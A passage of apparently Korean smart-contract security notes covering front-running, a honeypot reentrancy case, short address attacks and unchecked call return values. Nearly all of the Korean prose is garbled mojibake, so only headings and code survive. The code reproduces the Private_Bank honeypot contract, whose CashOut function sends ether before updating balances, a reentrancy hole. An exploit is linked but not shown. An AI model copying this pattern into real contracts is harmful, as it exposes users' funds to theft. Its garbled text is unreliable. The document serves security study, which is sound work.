ì¦‰, ì–´ë–¤ ê°ì‹œìžê°€ ê³µê°œì ìœ¼ë¡œ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ê²€ì¦í•˜ê³ , ê·¸ ì»¨íŠ¸ëž™íŠ¸ì˜ ì†Œìœ ìžë¡œ í•˜ì—¬ê¸ˆ ì•…ì˜ì ì¸ ë°©ë²•ìœ¼ë¡œ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ë°°í¬í•˜ë„ë¡ í•  ìˆ˜ ìžˆë‹¤. ê·¸ë¡œ ì¸í•´ ê³µê°œì ìœ¼ë¡œ ê°ì‚¬ëœ ì»¨íŠ¸ëž™íŠ¸ê°€ ì·¨ì•½ì ì´ë‚˜ ì•…ì˜ì ì¸ ì˜ë„ë¥¼ ê°–ê²Œ ë§Œë“¤ ìˆ˜ ìžˆë‹¤.

## 9-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- new í‚¤ì›Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ìž‘ì„±í•˜ëŠ” ê²ƒ
- ì™¸ë¶€ ì»¨íŠ¸ëž™íŠ¸ ì£¼ì†Œë¥¼ í•˜ë“œì½”ë”©í•˜ëŠ” ê²ƒ

## 9-3.  ðŸ—£ï¸ì‹¤ì œì‚¬ë¡€ : í—ˆë‹ˆíŒŸ ìž¬ì§„ìž…

`ë¬¸ì œì˜ í—ˆë‹ˆíŒŸ ì»¨íŠ¸ëž™íŠ¸`

```jsx
/**
 *Submitted for verification at Etherscan.io on 2018-02-09
*/

pragma solidity ^0.4.19;

contract Private_Bank
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 1 ether;
    
    Log TransferLog;
    
    function Private_Bank(address _log)
    {
        TransferLog = Log(_log);
    }
    
    function Deposit()
    public
    payable
    {
        if(msg.value >= MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {
            
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
```

`Exploit ì½”ë“œ`

[uERfI4PW59](https://ethfiddle.com/uERfI4PW59)


# 10. ì§§ì€ ì£¼ì†Œ/íŒŒë¼ë¯¸í„° ê³µê²©

ì†”ë¦¬ë””í‹° ì»¨íŠ¸ëž™íŠ¸ ìžì²´ì—ì„œëŠ” ìˆ˜í–‰ë˜ì§€ ì•Šì§€ë§Œ, ì´ ì»¨íŠ¸ëž™íŠ¸ì™€ ìƒí˜¸ìž‘ìš©í•˜ëŠ” ì œ 3ìžì˜ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ëŠ” ì¼ì–´ë‚  ìˆ˜ ìžˆë‹¤.

## 10-1. â˜ ï¸ì·¨ì•½ì 

- ìŠ¤ë§ˆíŠ¸ ì»¨íŠ¸ëž™íŠ¸ì— íŒŒë¼ë¯¸í„°ë¥¼ ì „ë‹¬í•  ë•Œ íŒŒë¼ë¯¸í„°ëŠ” ABI ì‚¬ì–‘ì— ë”°ë¼ ì¸ì½”ë”©ëœë‹¤.
- ì˜ˆìƒë˜ëŠ” íŒŒë¼ë¯¸í„° ê¸¸ì´ë³´ë‹¤ ì§§ì€, ì¸ì½”ë”©ëœ íŒŒë¼ë¯¸í„°ë¥¼ ë³´ë‚¼ ìˆ˜ ìžˆë‹¤.
- ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ EVMì€ ì¸ì½”ë”©ëœ íŒŒë¼ë¯¸í„° ëì— 0ì„ ì¶”ê°€í•˜ì—¬ ì •í•´ì§„ ê¸¸ì´ë¥¼ ë§žì¶˜ë‹¤.
- ì´ê²ƒì€ ì œ3ìž ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìž…ë ¥ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ì§€ ì•Šì„ ë•Œ ë¬¸ì œê°€ ëœë‹¤.

## 10-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

ì™¸ë¶€ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ëª¨ë“  ìž…ë ¥ íŒŒë¼ë¯¸í„°ëŠ” ë¸”ë¡ì²´ì¸ì— ë³´ë‚´ê¸° ì „ì— ìœ íš¨ì„±ì„ ê²€ì‚¬í•´ì•¼ í•œë‹¤.íŒŒë¼ë¯¸í„° ìˆœì„œê°€ ì¤‘ìš”í•œ ì—­í• ì€ í•œë‹¤ëŠ” ì ë„ ì£¼ëª©í•´ì•¼ í•œë‹¤.


# 11. í™•ì¸ë˜ì§€ ì•Šì€ CALL ë°˜í™˜ ê°’

call ë° send í•¨ìˆ˜ëŠ” í˜¸ì¶œ ì„±ê³µ ë˜ëŠ” ì‹¤íŒ¨ ì—¬ë¶€ë¥¼ ë‚˜íƒ€ë‚´ëŠ” true ë˜ëŠ” falseë¥¼ ë°˜í™˜í•œë‹¤. ë”°ë¼ì„œ ì™¸ë¶€ í˜¸ì¶œì´ ì‹¤íŒ¨í•  ê²½ìš° ì´ëŸ¬í•œ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” íŠ¸ëžœìž­ì…˜ì´ ë˜ëŒì•„ê°€ì§€ ì•Šìœ¼ë©°, ì˜¤ížˆë ¤ í•¨ìˆ˜ëŠ” ë‹¨ìˆœížˆ falseë¥¼ ë°˜í™˜í•œë‹¤.

## 11-1. ðŸ’€ì·¨ì•½ì 

call ë° send í•¨ìˆ˜ëŠ” í˜¸ì¶œ ì„±ê³µ ë˜ëŠ” ì‹¤íŒ¨ ì—¬ë¶€ë¥¼ ë‚˜íƒ€ë‚´ëŠ” true ë˜ëŠ” falseë¥¼ ë°˜í™˜í•œë‹¤. ë”°ë¼ì„œ ì™¸ë¶€ í˜¸ì¶œì´ ì‹¤íŒ¨í•  ê²½ìš° ì´ëŸ¬í•œ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” íŠ¸ëžœìž­ì…˜ì´ ë˜ëŒì•„ê°€ì§€ ì•Šìœ¼ë©°, ì˜¤ížˆë ¤ í•¨ìˆ˜ëŠ” ë‹¨ìˆœížˆ falseë¥¼ ë°˜í™˜í•œë‹¤.

## 11-2. ðŸ”’ì˜ˆë°©ê¸°ë²•

- ê°€ëŠ¥í•˜ë©´ send í•¨ìˆ˜ë³´ë‹¤ëŠ” transferí•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ìž.
- ì¶œê¸ˆ íŒ¨í„´(withdrawal pattern)ì„ ì‚¬ìš©í•œë‹¤ , ê° ì‚¬ìš©ìžëŠ” ì´ë”ë¥¼ ì»¨íŠ¸ëž™íŠ¸ë¡œë¶€í„° ë¹¼ë‚´ì˜¤ëŠ” ë°˜ë“œì‹œ ê²©ë¦¬ëœ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼ í•˜ê³ , ì¶œê¸ˆ í•¨ìˆ˜ê°€ ì‹¤íŒ¨í•˜ë©´ ê·¸ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ìµœì¢… ì‚¬ìš©ìžê°€ íŠ¸ëžœìž­ì…˜ì˜ ë¶€ë‹´ì„ ì§€ê²Œ í•œë‹¤.

## 11-3. ðŸ—£ï¸ì‹¤ì œì‚¬ë¡€ : ì´ë”íŒŸê³¼ ì´ë”ì˜ ì™•

ë‚´ìš©ì´ ë„ˆë¬´ ê¸¸ì–´ ë‹¤ í™•ì¸í•˜ëŠ”ë° íž˜ë“œë‹ˆ ì›ë¬¸ ì°¸ê³  ë¶€íƒ

**ì•”íŠ¼ sendëŠ” ì‹¤íŒ¨í•˜ë©´ ì»¨íŠ¸ëž™íŠ¸ë¥¼ ê³µê²©í•˜ëŠ”ë° ì‚¬ìš©ë  ìˆ˜ ìžˆìŒ**